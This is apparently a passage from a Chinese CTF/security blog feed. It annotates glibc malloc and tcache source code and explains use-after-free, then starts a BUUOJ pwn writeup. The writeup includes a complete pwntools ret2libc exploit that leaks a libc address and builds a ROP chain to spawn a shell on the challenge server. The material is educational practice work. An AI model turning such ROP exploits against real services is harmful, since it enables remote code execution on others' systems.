we don&#x27;t know if there are fastbins</span><br><span class="hljs-comment">          bordering top, so we cannot tell for sure whether threshold</span><br><span class="hljs-comment">          has been reached unless fastbins are consolidated.  But we</span><br><span class="hljs-comment">          don&#x27;t want to consolidate on each free.  As a compromise,</span><br><span class="hljs-comment">          consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span><br><span class="hljs-comment">          is reached.</span><br><span class="hljs-comment">        */</span><br>         <span class="hljs-comment">// 如果合并后的 chunk 的大小大于FASTBIN_CONSOLIDATION_THRESHOLD</span><br>         <span class="hljs-comment">// 一般合并到 top chunk 都会执行这部分代码。</span><br>         <span class="hljs-comment">// 那就向系统返还内存</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>            <span class="hljs-comment">// 如果有 fast chunk 就进行合并</span><br>            <span class="hljs-keyword">if</span> (have_fastchunks(av)) malloc_consolidate(av);<br>            <span class="hljs-comment">// 主分配区</span><br>            <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>                <span class="hljs-comment">// top chunk 大于当前的收缩阙值</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (chunksize(av-&gt;top)) &gt;=<br>                    (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (mp_.trim_threshold))<br>                    systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>      <span class="hljs-comment">// 非主分配区，则直接收缩heap</span></span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">/* Always try heap_trim(), even if the top chunk is not</span><br><span class="hljs-comment">                   large, because the corresponding heap might go away.  */</span><br>                heap_info *heap = heap_for_ptr(top(av));<br><br>                assert(heap-&gt;ar_ptr == av);<br>                heap_trim(heap, mp_.top_pad);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!have_lock) &#123;<br>            assert(locked);<br>            __libc_lock_unlock(av-&gt;mutex);<br>        &#125;<br></code></pre></td></tr></table></figure><h3 id="释放-mmap-的-chunk"><a href="#释放-mmap-的-chunk" class="headerlink" title="释放 mmap 的 chunk"></a>释放 mmap 的 chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//  If the chunk was allocated via mmap, release via munmap().</span><br>    munmap_chunk(p);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h1><h2 id="两个struct"><a href="#两个struct" class="headerlink" title="两个struct"></a>两个struct</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向的user-date部分嗷</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p><ul><li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li><li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li></ul><h2 id="基本宏定义"><a href="#基本宏定义" class="headerlink" title="基本宏定义"></a>基本宏定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></td></tr></table></figure><ul><li>Tcache为每个线程都预留了这样一个特殊的bins， bin的数量是64个 每个bin中最多缓存7个chunk。在64位系统上以0x10的字节递增，<strong>从24递增到1032字节</strong>。32位系统上则<strong>从12到512字节</strong>，所以Tcache缓存的是<strong>非Large Chunk的chunk</strong> </li></ul><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li><li>free 内存，且 size 小于 small bin size 时</li><li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul><h2 id="各个函数中关于tcache的部分"><a href="#各个函数中关于tcache的部分" class="headerlink" title="各个函数中关于tcache的部分"></a>各个函数中关于tcache的部分</h2><h3 id="–libc-malloc-1"><a href="#–libc-malloc-1" class="headerlink" title="–libc-malloc  "></a><a href="#__libc_malloc">–libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// 初始化 tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//如果为空就执行初始化函数</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// 根据 size 得到的 idx 在合法的范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] 有 chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// 找到可用的 arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//这是.....不成功再来一遍?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//注释说如果取不到的话就等会再试, 通常在内存空间小的情况下</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// 初始化 tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></td></tr></table></figure><h3 id="申请内存-2-27"><a href="#申请内存-2-27" class="headerlink" title="申请内存 2.27"></a>申请内存 <u>2.27</u></h3><p>接下来将进入申请内存的步骤</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-comment">// 从 tcache list 中获取内存</span><br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 由 size 计算的 idx 在合法范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// 该条 tcache 链不为空</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-comment">// 进入与无 tcache 时的流程</span><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</li></ul><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>看一下 <code>tcache_get()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// 获得一个 chunk，counts 减一</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</li></ul><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>看完申请，再看看有 tcache 时的释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</li></ul><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>跟进 <code>_int_free()</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></td></tr></table></figure><ul><li>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</li></ul><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</li></ul><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>src code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc_malloc</tag>
      
      <tag>源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前六道题小结-有点懒直接总结"><a href="#1-前六道题小结-有点懒直接总结" class="headerlink" title="1.前六道题小结:(有点懒直接总结)"></a>1.前六道题小结:(有点懒直接总结)</h2><ul><li>第一题测试nc命令</li><li>pwn1_sctf_2016: 一堆std::string啥的操作<strong>根本没看懂是什么</strong>.</li><li>ciscn_n_1: 栈溢出覆盖浮点数过if语句, 直接到IDA View查看十六进制的数值就可以了</li><li>剩下的几题太简单了(回头来看的题都是这么简单!)</li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>由于没有给出libc库以及libc库的版本, 所以git clone python的LibcSearcher库, 并且学习如何使用.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>ret_addr = <span class="hljs-number">0x4006b9</span> <span class="hljs-comment">#这两个是用ROPgadget找到的, 使用了ROPgadget --binary filename --only &quot;pop|ret&quot; | grep rdi命令</span><br>rdipop_addr = <span class="hljs-number">0x400c83</span><br><br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">28804</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;ice!\n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)  <span class="hljs-comment">#class pwnlib.elf.elf.ELF(path, checksec=True)注意参数是路径,别忘了&quot;./&quot;</span><br>plt_addr = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>got_addr = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><span class="hljs-comment">#                     x64机器压入参数     唯一一个参数     ret指令跳转到的地址  函数返回地址(重新到main)</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x58</span> + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;pted\n&quot;</span>, payload)<br>p.recvuntil(<span class="hljs-string">&#x27;Ciphertext\n&#x27;</span>)<br>p.recvline()<br>addr = u64(p.recv(<span class="hljs-number">7</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))  <span class="hljs-comment">#我也不知道这是为啥</span><br><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, addr)<br>libc_base = addr - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh_addr = libc_base + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<br><span class="hljs-comment">#                     栈平衡           x64机器压入参数     唯一一个参数       ret指令跳转到的地址</span><br>payload = <span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">0x58</span> + p64(ret_addr) + p64(rdipop_addr) + p64(binsh_addr) + p64(sys_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;ice!\n&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;ted\n&quot;</span>, payload)<br><br>p.interactive() <span class="hljs-comment">#将程序的输出输入流改为 标准输出输入流</span><br></code></pre></td></tr></table></figure><p>tips:</p><ul><li><p><code>payload = b&#39;b&#39;*0x58 + p64(rdipop_addr) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</code></p><p>GOT顾名思义它只是一张表, 第一次链接后存放着函数的起始地址, plt表中使用 jmp *GOT[4], 即GOT表元素的引用, 第三个p64不能改为got_addr!!!!!!!!!!!!!</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher用法.(就是某位国人写的小工具, 至于为啥是str_bin_sh我还不知道.......)</span><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span><br>obj = LibcSearcher(<span class="hljs-string">&quot;fgets&quot;</span>, <span class="hljs-number">0X7ff39014bd90</span>)<br>obj.dump(<span class="hljs-string">&quot;system&quot;</span>)        <span class="hljs-comment">#system 